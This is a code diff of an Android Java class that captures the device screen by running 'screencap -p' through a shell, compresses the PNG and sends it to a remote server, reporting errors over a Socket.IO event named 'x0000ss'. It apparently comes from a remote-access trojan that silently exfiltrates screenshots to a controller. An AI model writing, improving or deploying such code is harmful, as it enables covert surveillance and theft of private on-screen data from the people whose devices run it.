@@ -62,35 +62,74 @@ public class ScreenshotManager {
 
     /**
      * Chụp screenshot bằng shell command
-     * Hoạt động trên hầu hết Android versions
+     * Đọc trực tiếp từ stream để tránh lỗi permission ghi file
      */
     private void takeScreenshotViaShell() {
         new Thread(() -> {
             try {
-                // Tạo file tạm
-                File screenshotFile = new File(context.getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".png");
+                // Thử chụp bằng lệnh screencap -p (PNG format)
+                Process process = Runtime.getRuntime().exec("screencap -p");
                 
-                // Chạy shell command để chụp màn hình
-                String command = "screencap -p " + screenshotFile.getAbsolutePath();
-                Process process = Runtime.getRuntime().exec(command);
+                // Đọc dữ liệu từ stream
+                java.io.InputStream is = process.getInputStream();
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                byte[] buffer = new byte[8192];
+                int bytesRead;
+                
+                while ((bytesRead = is.read(buffer)) != -1) {
+                    baos.write(buffer, 0, bytesRead);
+                }
+                
                 process.waitFor();
                 
-                if (screenshotFile.exists() && screenshotFile.length() > 0) {
-                    Log.d(TAG, "Screenshot captured: " + screenshotFile.length() + " bytes");
-                    
-                    // Đọc file và gửi lên server
-                    sendScreenshotFile(screenshotFile);
-                    
-                    // Xóa file tạm
-                    screenshotFile.delete();
+                byte[] data = baos.toByteArray();
+                
+                if (data.length > 0) {
+                    // Kiểm tra header PNG
+                    if (data.length > 8 && data[0] == (byte)0x89 && data[1] == (byte)0x50) {
+                         Log.d(TAG, "Screenshot captured via stream: " + data.length + " bytes");
+                         // Compress và gửi
+                         data = compressImage(data);
+                         sendToServer(data);
+                    } else {
+                        // Header không phải PNG
+                         Log.e(TAG, "Captured data is not valid PNG");
+                         
+                         // Đọc error stream
+                         java.io.InputStream es = process.getErrorStream();
+                         ByteArrayOutputStream eos = new ByteArrayOutputStream();
+                         while ((bytesRead = es.read(buffer)) != -1) {
+                             eos.write(buffer, 0, bytesRead);
+                         }
+                         String errorMsg = new String(eos.toByteArray());
+                         sendError("Screenshot failed. CMD Output: " + errorMsg);
+                    }
                 } else {
-                    Log.e(TAG, "Screenshot file not created");
+                    Log.e(TAG, "Screenshot stream empty");
+                     // Đọc error stream để biết lý do
+                     java.io.InputStream es = process.getErrorStream();
+                     ByteArrayOutputStream eos = new ByteArrayOutputStream();
+                     while ((bytesRead = es.read(buffer)) != -1) {
+                         eos.write(buffer, 0, bytesRead);
+                     }
+                     String errorMsg = new String(eos.toByteArray());
+                    sendError("Screenshot stream empty. Error: " + errorMsg);
                 }
                 
             } catch (Exception e) {
                 Log.e(TAG, "Error in shell screenshot", e);
+                sendError("Exception: " + e.getMessage());
             }
         }).start();
+    }
+
+    private void sendError(String msg) {
+        try {
+            JSONObject data = new JSONObject();
+            data.put("screenshot", false);
+            data.put("error", msg);
+            IOSocket.getInstance().getIoSocket().emit("x0000ss", data);
+        } catch (Exception e) {}
     }
 
     /**
